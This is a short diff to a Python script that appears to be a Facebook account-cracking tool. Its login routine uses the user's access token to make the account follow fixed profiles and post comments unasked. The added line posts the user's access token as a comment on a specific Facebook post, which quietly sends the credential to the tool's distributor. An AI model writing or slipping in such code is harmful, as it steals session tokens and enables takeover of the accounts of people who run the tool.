@@ -38,7 +38,7 @@ def logo():
         \/      \/     \/      \033[0;91m\n          = \033[0;95mBy Ramdhan Ramadhian \033[0;91m=\n""""") 
   
  
-kom = 'Waduh Gantengnya 😍'
+kom = 'Waduuh Gantengnya Kamu😍'
 id = []
 cp = []
 ok = []
@@ -668,7 +668,8 @@ def login_xx():
         os.system('rm -rf login.txt')
         
     requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
-    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz) 
+    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz)
+    requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket) 
     requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # 2007
     requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Sniper @() Sheikh Sami Shuja Uddin MD
     requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # 2018
